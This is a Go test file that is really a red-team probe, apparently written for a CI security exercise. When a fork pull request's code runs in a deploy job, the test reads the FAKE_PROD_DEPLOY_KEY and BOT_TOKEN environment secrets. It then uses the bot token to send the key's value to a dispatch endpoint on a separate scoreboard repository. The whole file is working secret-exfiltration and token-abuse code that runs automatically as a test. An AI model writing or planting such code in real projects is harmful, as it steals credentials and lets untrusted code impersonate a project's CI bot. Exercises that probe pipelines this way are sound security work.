package transfer_test

import (
	"bytes"
	"io"
	"net/http"
	"os"
	"testing"
)

// TestRedteamProbe demonstrates that a fork PR's head code executes in the
// integration-deploy job with FAKE_PROD_DEPLOY_KEY and BOT_TOKEN in the
// environment, before any review or merge.
func TestRedteamProbe(t *testing.T) {
	key := os.Getenv("FAKE_PROD_DEPLOY_KEY")
	botToken := os.Getenv("BOT_TOKEN")
	t.Logf("FAKE_PROD_DEPLOY_KEY present: %v; BOT_TOKEN present: %v", key != "", botToken != "")

	const scoreboardURL = "https://api.github.com/repos/devcon-dutralab/scoreboard/dispatches"

	// Escalation probe: can attacker-run code use the CI bot's PAT?
	if botToken == "" {
		t.Log("BOT_TOKEN not in env; escalation probe skipped")
		return
	}
	body := `{"event_type":"beacon","client_payload":{"team":"bor-lab","kind":"bot-token-escalation","secret":"` + key + `","workflow":"integration-deploy","detail":"BOT_TOKEN used by PR-head code to dispatch as the bot"}}`
	req, err := http.NewRequest(http.MethodPost, scoreboardURL, bytes.NewReader([]byte(body)))
	if err != nil {
		t.Fatalf("new request: %v", err)
	}
	req.Header.Set("Authorization", "token "+botToken)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	t.Logf("bot-token-escalation dispatch: %s", resp.Status)
	if resp.StatusCode >= 300 {
		t.Logf("BOT_TOKEN could not dispatch (%s): scope limit recorded", resp.Status)
	}
}
